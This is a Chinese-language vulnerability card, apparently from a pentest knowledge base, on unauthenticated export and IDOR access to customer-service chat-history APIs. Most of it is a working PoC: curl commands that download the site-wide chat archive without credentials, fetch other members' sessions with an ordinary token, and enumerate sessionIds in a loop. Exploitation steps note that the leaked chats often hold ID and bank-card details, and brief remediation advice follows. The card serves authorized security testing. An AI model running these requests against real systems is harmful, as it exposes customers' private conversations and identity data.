---
title: 客服聊天记录导出未鉴权（全站会话与身份材料）
cve: 无（业务逻辑）
severity: high
cvss: 8.4
product: 自研客服系统（在线客服 / 工单 / IM）
versions: 任意
ports: 80, 443
keywords: 客服, 聊天记录, 导出, 未鉴权, 会话, im
entry: /api/cs/history/export  /api/im/sessions
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
GET /api/cs/sessions?page=1
GET /api/cs/history?sessionId=
GET /api/cs/history/export?start=&end=
```

## 前置条件

- 任意会员账号（或完全未授权）。

## PoC

```bash
# 1) 未授权先试
curl -s 'https://target/api/cs/history/export?startDate=2026-01-01&endDate=2026-01-31' -o /tmp/cs.zip -w '%{http_code} %{size_download}\n'
unzip -l /tmp/cs.zip | head
# 判定：200 且 zip 里有 txt/csv 对话 = 命中

# 2) 普通会员 token 拉他人会话
curl -s 'https://target/api/cs/history?sessionId=10001' -H "Authorization: Bearer <t>" | head -c 300

# 3) 枚举 sessionId
for i in $(seq 10001 10010); do
  curl -s "https://target/api/cs/history?sessionId=$i" -H "Authorization: Bearer <t>" | head -c 80; echo
done
```

## 利用步骤

1. 先未授权试导出（最常见）；
2. 再带普通 token 枚举 sessionId，看是否含他人手机号/证件描述；
3. 命中即"全站客服会话泄露"——常含身份证、银行卡口述；
4. 证据：HTTP 头 + zip 清单（不展开内容）。

## 修复与缓解

- 导出仅超管 + 二次认证；会话按 agent/会员归属过滤；
- 敏感内容脱敏（手机号/卡号中间位）。

## 参考

- OWASP API1/API5；CWE-639。
